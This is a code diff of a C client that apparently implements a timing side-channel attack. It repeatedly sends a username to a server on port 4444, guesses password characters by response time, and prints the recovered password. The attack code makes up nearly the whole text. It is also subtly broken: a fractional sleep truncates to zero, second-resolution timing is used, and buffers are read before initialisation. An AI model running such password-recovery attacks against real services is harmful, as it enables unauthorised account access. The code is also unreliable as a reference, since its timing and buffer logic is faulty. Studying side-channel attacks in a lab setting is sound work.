@@ -11,19 +11,10 @@
 
 #define PORT 4444
 
-// char characters[] = {
-//     'q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p', 'a', 's', 'd', 'f', 'g', 'h', 'j', 
-//     'k', 'l', 'z', 'x', 'c', 'v', 'b', 'n', 'm', 'q', 'w', 'e', 'r', 't', 'y', 'u', 'i',
-//     'o', 'p', 'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', 'z', 'x', 'c', 'v', 'b', 'n', 'm',
-//     'Q', 'W', 'E', 'R', 'T', 'y', 'u', 'i', 'o', 'p', 'a', 's', 'd', 'f', 'g', 'h', 'j', 
-//     'k', 'l', 'z', 'x', 'c', 'v', 'b', 'n', 'm', 'q', 'w', 'e', 'r', 't', 'y', 'u', 'i',
-//     'o', 'p', 'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', 'z', 'x', 'c', 'v', 'b', 'n', 'm',       
-// }
+void discoverPassword(int clientSocket, char* username) {
 
-char* discoverPassword(int clientSocket, char* username) {
-
-    char* rightPassword = "";
-    char* password_buffer = "!";
+    char password_buffer[1024];
+    char rightPassword[1024];
     char server_buffer[1024];
 
     char maxTimeChar;
@@ -31,17 +22,13 @@ char* discoverPassword(int clientSocket, char* username) {
     char currChar = 33;
     time_t timeBefore, timeAfter;
 
-    // Send the username to the server
-    send(clientSocket, username, strlen(username), 0);
-    if(strcmp(username, ":exit") == 0) {
-        close(clientSocket);
-        printf("[-]Disconnected from server.\n");
-        exit(1);
-    }
+    //Perform the timing attack to discover the password
+    for(int i=0; i<1024; i++) {
+        send(clientSocket, username, strlen(username), 0);
+        sleep(0.10);
 
-    // Perform the timing attack to discover the password
-    while(1) {
-        strcpy(password_buffer, (rightPassword+currChar));
+        strcpy(password_buffer, rightPassword);
+        password_buffer[strlen(password_buffer)] = currChar;
 
         timeBefore = time(NULL);
 
@@ -74,21 +61,25 @@ char* discoverPassword(int clientSocket, char* username) {
         maxTime = 0;
         bzero(server_buffer, sizeof(server_buffer)); 
     }
-    
-    return rightPassword;
+
+    printf("Success! The password is: %s\n\n", rightPassword);
 }
 
 void chatWithServer(int clientSocket) {
 
     char username_buffer[1024];
-    char* password;
 
     while(1) {
         printf("Username: ");
         scanf("%s", &username_buffer[0]);
+
+        if(strcmp(username_buffer, ":exit") == 0) {
+            close(clientSocket);
+            printf("[-]Disconnected from server.\n");
+            exit(1);
+        }
         
-        password = discoverPassword(clientSocket, username_buffer);
-        printf("Success! The password is: %s", password);
+        discoverPassword(clientSocket, username_buffer);
 
         bzero(username_buffer, sizeof(username_buffer));
     }
